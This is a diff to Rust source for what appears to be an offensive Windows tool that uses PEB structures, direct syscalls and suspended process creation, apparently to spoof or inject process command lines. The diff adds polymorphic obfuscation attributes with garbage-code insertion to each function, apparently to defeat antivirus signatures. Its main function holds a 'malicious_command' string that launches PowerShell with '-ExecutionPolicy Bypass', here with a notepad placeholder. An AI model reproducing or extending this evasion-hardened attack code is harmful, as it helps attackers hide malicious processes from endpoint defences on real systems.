@@ -1,7 +1,7 @@
 #![allow(non_snake_case)]
 use std::mem::{size_of, zeroed};
 use std::ptr::null_mut;
-
+use rustpolymorphic::polymorph;
 use ntapi::ntpebteb::PEB;
 use ntapi::ntpsapi::PROCESS_BASIC_INFORMATION;
 use rust_syscalls::syscall;
@@ -14,10 +14,12 @@ use winapi::um::processthreadsapi::{
 use winapi::um::winbase::{CREATE_NEW_CONSOLE, CREATE_SUSPENDED};
 use winapi::um::winnt::{LPCWSTR, LPWSTR};
 
+#[polymorph(fn_len = 10, garbage = true)]
 fn to_wide_chars(s: &str) -> Vec<u16> {
     s.encode_utf16().collect()
 }
 
+#[polymorph(fn_len = 10, garbage = true)]
 fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
     let mut wide = to_wide_chars(s);
     if wide.len() < total_width {
@@ -26,6 +28,7 @@ fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
     wide
 }
 
+#[polymorph(fn_len = 10, garbage = true)]
 fn main() {
     let malicious_command = "powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
     let malicious_command_wide = to_wide_chars(malicious_command);
